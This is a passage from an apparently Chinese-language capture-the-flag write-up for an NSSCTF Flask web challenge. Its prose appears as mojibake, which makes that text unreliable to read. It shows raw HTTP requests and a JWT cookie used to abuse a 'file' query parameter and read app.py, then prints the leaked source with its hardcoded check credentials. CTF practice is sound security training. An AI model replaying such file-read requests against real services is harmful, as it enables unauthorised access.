class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;swagger&quot;: &quot;2.0&quot;,</span><br><span class="line">    &quot;info&quot;: &#123;</span><br><span class="line">      &quot;description&quot;: &quot;Interface API Documentation&quot;,</span><br><span class="line">      &quot;version&quot;: &quot;1.1&quot;,</span><br><span class="line">      &quot;title&quot;: &quot;Interface API&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;paths&quot;: &#123;</span><br><span class="line">      &quot;/api-base/v0/register&quot;: &#123;</span><br><span class="line">        &quot;post&quot;: &#123;</span><br><span class="line">          &quot;consumes&quot;: [</span><br><span class="line">            &quot;application/json&quot;</span><br><span class="line">          ],</span><br><span class="line">          &quot;summary&quot;: &quot;User Registration API&quot;,</span><br><span class="line">          &quot;description&quot;: &quot;Used for user registration&quot;,</span><br><span class="line">          &quot;parameters&quot;: [</span><br><span class="line">            &#123;</span><br><span class="line">              &quot;username&quot;: &quot;body&quot;,</span><br><span class="line">              &quot;in&quot;: &quot;body&quot;,</span><br><span class="line">              &quot;required&quot;: true,</span><br><span class="line">              &quot;schema&quot;: &#123;</span><br><span class="line">                &quot;$ref&quot;: &quot;#/definitions/UserRegistration&quot;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">              &quot;password&quot;: &quot;body&quot;,</span><br><span class="line">              &quot;in&quot;: &quot;body&quot;,</span><br><span class="line">              &quot;required&quot;: true,</span><br><span class="line">              &quot;schema&quot;: &#123;</span><br><span class="line">                &quot;$ref&quot;: &quot;#/definitions/UserRegistration&quot;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          ],</span><br><span class="line">          &quot;responses&quot;: &#123;</span><br><span class="line">            &quot;200&quot;: &#123;</span><br><span class="line">              &quot;description&quot;: &quot;success&quot;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;400&quot;: &#123;</span><br><span class="line">              &quot;description&quot;: &quot;Invalid request parameters&quot;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;401&quot;: &#123;</span><br><span class="line">              &quot;description&quot;: &quot;Your wisdom is not sufficient to be called a sage&quot;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;/api-base/v0/login&quot;: &#123;</span><br><span class="line">        &quot;post&quot;: &#123;</span><br><span class="line">          &quot;consumes&quot;: [</span><br><span class="line">            &quot;application/json&quot;</span><br><span class="line">          ],</span><br><span class="line">          &quot;summary&quot;: &quot;User Login API&quot;,</span><br><span class="line">          &quot;description&quot;: &quot;Used for user login&quot;,</span><br><span class="line">          &quot;parameters&quot;: [</span><br><span class="line">            &#123;</span><br><span class="line">              &quot;username&quot;: &quot;body&quot;,</span><br><span class="line">              &quot;in&quot;: &quot;body&quot;,</span><br><span class="line">              &quot;required&quot;: true,</span><br><span class="line">              &quot;schema&quot;: &#123;</span><br><span class="line">                &quot;$ref&quot;: &quot;#/definitions/UserLogin&quot;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">              &quot;password&quot;: &quot;body&quot;,</span><br><span class="line">              &quot;in&quot;: &quot;body&quot;,</span><br><span class="line">              &quot;required&quot;: true,</span><br><span class="line">              &quot;schema&quot;: &#123;</span><br><span class="line">                &quot;$ref&quot;: &quot;#/definitions/UserLogin&quot;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          ],</span><br><span class="line">          &quot;responses&quot;: &#123;</span><br><span class="line">            &quot;200&quot;: &#123;</span><br><span class="line">              &quot;description&quot;: &quot;success&quot;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;400&quot;: &#123;</span><br><span class="line">              &quot;description&quot;: &quot;Invalid request parameters&quot;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;/api-base/v0/search&quot;: &#123;</span><br><span class="line">        &quot;get&quot;: &#123;</span><br><span class="line">          &quot;summary&quot;: &quot;Information Query API&quot;,</span><br><span class="line">          &quot;description&quot;: &quot;Used to query information&quot;,</span><br><span class="line">          &quot;parameters&quot;: [</span><br><span class="line">            &#123;</span><br><span class="line">              &quot;name&quot;: &quot;file&quot;,</span><br><span class="line">              &quot;in&quot;: &quot;query&quot;,</span><br><span class="line">              &quot;required&quot;: true,</span><br><span class="line">              &quot;type&quot;: &quot;string&quot;</span><br><span class="line">            &#125;</span><br><span class="line">          ],</span><br><span class="line">          &quot;responses&quot;: &#123;</span><br><span class="line">            &quot;200&quot;: &#123;</span><br><span class="line">              &quot;description&quot;: &quot;success&quot;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;400&quot;: &#123;</span><br><span class="line">              &quot;description&quot;: &quot;Invalid request parameters&quot;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;401&quot;: &#123;</span><br><span class="line">              &quot;description&quot;: &quot;Unauthorized&quot;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;404&quot;: &#123;</span><br><span class="line">              &quot;description&quot;: &quot;File not found&quot;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;,</span><br><span class="line">          &quot;security&quot;: [</span><br><span class="line">            &#123;</span><br><span class="line">              &quot;TokenAuth&quot;: []</span><br><span class="line">            &#125;</span><br><span class="line">          ]</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;/api-base/v0/logout&quot;: &#123;</span><br><span class="line">        &quot;get&quot;: &#123;</span><br><span class="line">          &quot;summary&quot;: &quot;Logout API&quot;,</span><br><span class="line">          &quot;description&quot;: &quot;Used for user logout&quot;,</span><br><span class="line">          &quot;responses&quot;: &#123;</span><br><span class="line">            &quot;200&quot;: &#123;</span><br><span class="line">              &quot;description&quot;: &quot;success&quot;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;401&quot;: &#123;</span><br><span class="line">              &quot;description&quot;: &quot;Unauthorized&quot;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;,</span><br><span class="line">          &quot;security&quot;: [</span><br><span class="line">            &#123;</span><br><span class="line">              &quot;TokenAuth&quot;: []</span><br><span class="line">            &#125;</span><br><span class="line">          ]</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;definitions&quot;: &#123;</span><br><span class="line">      &quot;UserRegistration&quot;: &#123;</span><br><span class="line">        &quot;type&quot;: &quot;object&quot;,</span><br><span class="line">        &quot;properties&quot;: &#123;</span><br><span class="line">          &quot;username&quot;: &#123;</span><br><span class="line">            &quot;type&quot;: &quot;string&quot;</span><br><span class="line">          &#125;,</span><br><span class="line">          &quot;password&quot;: &#123;</span><br><span class="line">            &quot;type&quot;: &quot;string&quot;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;UserLogin&quot;: &#123;</span><br><span class="line">        &quot;type&quot;: &quot;object&quot;,</span><br><span class="line">        &quot;properties&quot;: &#123;</span><br><span class="line">          &quot;username&quot;: &#123;</span><br><span class="line">            &quot;type&quot;: &quot;string&quot;</span><br><span class="line">          &#125;,</span><br><span class="line">          &quot;password&quot;: &#123;</span><br><span class="line">            &quot;type&quot;: &quot;string&quot;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;securityDefinitions&quot;: &#123;</span><br><span class="line">      &quot;TokenAuth&quot;: &#123;</span><br><span class="line">        &quot;type&quot;: &quot;apiKey&quot;,</span><br><span class="line">        &quot;name&quot;: &quot;Authorization&quot;,</span><br><span class="line">        &quot;in&quot;: &quot;header&quot;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;security&quot;: [</span><br><span class="line">      &#123;</span><br><span class="line">        &quot;TokenAuth&quot;: []</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>ä¸æœƒçœ‹, æ‹‹çµ¦Dè€å¸«åˆ†æäº†ä¸€ä¸‹:</p><h3 id="ä¸»è¦çµ„æˆéƒ¨åˆ†"><a href="#ä¸»è¦çµ„æˆéƒ¨åˆ†" class="headerlink" title="ä¸»è¦çµ„æˆéƒ¨åˆ†"></a>ä¸»è¦çµ„æˆéƒ¨åˆ†</h3><h3 id="åŸºç¤è³‡è¨Š"><a href="#åŸºç¤è³‡è¨Š" class="headerlink" title="åŸºç¤è³‡è¨Š"></a>åŸºç¤è³‡è¨Š</h3><p>API ç‰ˆæœ¬ï¼šSwagger 2.0</p><p>æ¨™é¡Œï¼šInterface API</p><p>ç‰ˆæœ¬ï¼š1.1</p><p>æè¿°ï¼šä»‹é¢ API æ–‡æª”</p><ol start="2"><li>API ç«¯é»åˆ†æ<br>ğŸ” èªè­‰ç›¸é—œç«¯é»<br>POST &#x2F;api-base&#x2F;v0&#x2F;register - ç”¨æˆ¶è¨»å†Š</li></ol><p>éœ€è¦ username å’Œ password</p><p>éŸ¿æ‡‰ï¼š200æˆåŠŸ, 400åƒæ•¸éŒ¯èª¤, 401æ¬Šé™ä¸è¶³</p><p>POST &#x2F;api-base&#x2F;v0&#x2F;login - ç”¨æˆ¶ç™»å…¥</p><p>éœ€è¦ username å’Œ password</p><p>éŸ¿æ‡‰ï¼š200æˆåŠŸ, 400åƒæ•¸éŒ¯èª¤</p><p>ğŸ” è³‡æ–™æŸ¥è©¢ç«¯é»<br>GET &#x2F;api-base&#x2F;v0&#x2F;search - è³‡è¨ŠæŸ¥è©¢</p><p>éœ€è¦ file æŸ¥è©¢åƒæ•¸</p><p>éœ€è¦ Token èªè­‰</p><p>éŸ¿æ‡‰ï¼š200æˆåŠŸ, 400åƒæ•¸éŒ¯èª¤, 401æœªæˆæ¬Š, 404æª”æ¡ˆä¸å­˜åœ¨</p><p>ğŸšª ç™»å‡ºç«¯é»<br>GET &#x2F;api-base&#x2F;v0&#x2F;logout - ç”¨æˆ¶ç™»å‡º</p><p>éœ€è¦ Token èªè­‰</p><p>éŸ¿æ‡‰ï¼š200æˆåŠŸ, 401æœªæˆæ¬Š</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;UserRegistration&quot;: &#123; &quot;username&quot;, &quot;password&quot; &#125;,</span><br><span class="line">  &quot;UserLogin&quot;: &#123; &quot;username&quot;, &quot;password&quot; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç”¨BPæ³¨å†Œä¸€ä¸ªè´¦æˆ·å…ˆ:</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /api-base/v0/register HTTP/1.1</span><br><span class="line">Host: node5.anna.nssctf.cn:21401</span><br><span class="line">Content-Type:application/json</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Accept-Language: zh-TW,zh;q=0.9</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">If-None-Match: &quot;1708337513.0-4226-1006306968&quot;</span><br><span class="line">If-Modified-Since: Mon, 19 Feb 2024 10:11:53 GMT</span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line">&#123;&quot;username&quot;:&quot;a&quot;,&quot;password&quot;:&quot;a&quot;&#125;</span><br></pre></td></tr></table></figure><img src="ddb0bc5ed20228a85676ba21ed691acd.png" alt="ddb0bc5ed20228a85676ba21ed691acd.png" /><p>login ä¸€ä¸‹</p><img src="ceb050b212f68f02ec7f1146781f49e8.png" alt="ceb050b212f68f02ec7f1146781f49e8.png" /><p>ç”¨ä»¥ä¸‹çš„cookie:<br>æ‹‹å»jwt.io:</p><img src="9bb2273710f6ca2f594de0e6ea7f537b.png" alt="9bb2273710f6ca2f594de0e6ea7f537b.png" /><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /api-base/v0/search   HTTP/1.1</span><br><span class="line">Host: node5.anna.nssctf.cn:21401</span><br><span class="line">Content-Type:application/json</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Cookie:token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImEiLCJwYXNzd29yZCI6ImEifQ.BN9dROQHEp6L0iPx03SgsNO2c3rGac428_lCXh4E2ig</span><br><span class="line">Accept-Language: zh-TW,zh;q=0.9</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">If-None-Match: &quot;1708337513.0-4226-1006306968&quot;</span><br><span class="line">If-Modified-Since: Mon, 19 Feb 2024 10:11:53 GMT</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Length: 4</span><br></pre></td></tr></table></figure><img src="352dfcac48a77da66e3bb9065d9a1305.png" alt="352dfcac48a77da66e3bb9065d9a1305.png" /><p>ç›²çŒœä¸€ä¸‹é€™æ˜¯flaskå¯«çš„ , file &#x3D; app.py </p><img src="ea6506e3ad4c28e8926ab4ccfca1a780.png" alt="ea6506e3ad4c28e8926ab4ccfca1a780.png" /><br/><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># coding=gbk</span></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify, send_file, render_template_string</span><br><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> wraps</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;TEMPLATES_RELOAD&#x27;</span>] = <span class="literal">True</span></span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = os.environ.get(<span class="string">&#x27;SECRET_KEY&#x27;</span>)</span><br><span class="line">current_time = datetime.now().strftime(<span class="string">&#x27;%Y-%m-%d %H:%M:%S&#x27;</span>)</span><br><span class="line"></span><br><span class="line">response0 = &#123;<span class="string">&#x27;code&#x27;</span>: <span class="number">0</span>, <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;failed&#x27;</span>, <span class="string">&#x27;result&#x27;</span>: <span class="literal">None</span>&#125;</span><br><span class="line">response1 = &#123;<span class="string">&#x27;code&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;success&#x27;</span>, <span class="string">&#x27;result&#x27;</span>: current_time&#125;</span><br><span class="line">response2 = &#123;<span class="string">&#x27;code&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;Invalid request parameters&#x27;</span>, <span class="string">&#x27;result&#x27;</span>: <span class="literal">None</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">auth</span>(<span class="params">func</span>):</span><br><span class="line"><span class="meta">    @wraps(<span class="params">func</span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decorated</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">        token = request.cookies.get(<span class="string">&#x27;token&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> token:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Invalid token&#x27;</span>, <span class="number">401</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            payload = jwt.decode(token, app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>], algorithms=[<span class="string">&#x27;HS256&#x27;</span>])</span><br><span class="line">            <span class="keyword">if</span> payload[<span class="string">&#x27;username&#x27;</span>] == User.username <span class="keyword">and</span> payload[<span class="string">&#x27;password&#x27;</span>] == User.password:</span><br><span class="line">                <span class="keyword">return</span> func(*args, **kwargs)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;Invalid token&#x27;</span>, <span class="number">401</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Something error?&#x27;</span>, <span class="number">500</span></span><br><span class="line">    <span class="keyword">return</span> decorated</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">func</span>):</span><br><span class="line"><span class="meta">    @wraps(<span class="params">func</span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decorated</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">        token = request.cookies.get(<span class="string">&#x27;token&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> token:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Invalid token&#x27;</span>, <span class="number">401</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            payload = jwt.decode(token, app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>], algorithms=[<span class="string">&#x27;HS256&#x27;</span>])</span><br><span class="line">            <span class="keyword">if</span> payload[<span class="string">&#x27;username&#x27;</span>] == <span class="string">&quot;Plato&quot;</span> <span class="keyword">and</span> payload[<span class="string">&#x27;password&#x27;</span>] == <span class="string">&quot;ideal_state&quot;</span>:</span><br><span class="line">                <span class="keyword">return</span> func(*args, **kwargs)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;You are not a sage. You cannot enter the ideal state.&#x27;</span>, <span class="number">401</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Something error?&#x27;</span>, <span class="number">500</span></span><br><span class="line">    <span class="keyword">return</span> decorated</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> send_file(<span class="string">&#x27;api-docs.json&#x27;</span>, mimetype=<span class="string">&#x27;application/json;charset=utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/enterIdealState&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">@check</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getflag</span>():</span><br><span class="line">    flag = os.popen(<span class="string">&quot;/readflag&quot;</span>).read()</span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/api-base/v0/register&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username = request.json[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> username == <span class="string">&quot;Plato&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Your wisdom is not sufficient to be called a sage.&#x27;</span>, <span class="number">401</span></span><br><span class="line">        password = request.json[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">        User.setUser(username, password)</span><br><span class="line">        token = jwt.encode(&#123;<span class="string">&#x27;username&#x27;</span>: username, <span class="string">&#x27;password&#x27;</span>: password&#125;, app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>], algorithm=<span class="string">&#x27;HS256&#x27;</span>)</span><br><span class="line">        User.setToken(token)</span><br><span class="line">        <span class="keyword">return</span> jsonify(response1)</span><br><span class="line">    <span class="keyword">return</span> jsonify(response2), <span class="number">400</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/api-base/v0/login&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username = request.json[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        password = request.json[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            token = User.token</span><br><span class="line">            payload = jwt.decode(token, app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>], algorithms=[<span class="string">&#x27;HS256&#x27;</span>])</span><br><span class="line">            <span class="keyword">if</span> payload[<span class="string">&#x27;username&#x27;</span>] == username <span class="keyword">and</span> payload[<span class="string">&#x27;password&#x27;</span>] == password:</span><br><span class="line">                response = jsonify(response1)</span><br><span class="line">                response.set_cookie(<span class="string">&#x27;token&#x27;</span>, token)</span><br><span class="line">                <span class="keyword">return</span> response</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> jsonify(response0), <span class="number">401</span></span><br><span class="line">        <span class="keyword">except</span> jwt.ExpiredSignatureError:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Invalid token&#x27;</span>, <span class="number">401</span></span><br><span class="line">        <span class="keyword">except</span> jwt.InvalidTokenError:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Invalid token&#x27;</span>, <span class="number">401</span></span><br><span class="line">    <span class="keyword">return</span> jsonify(response2), <span 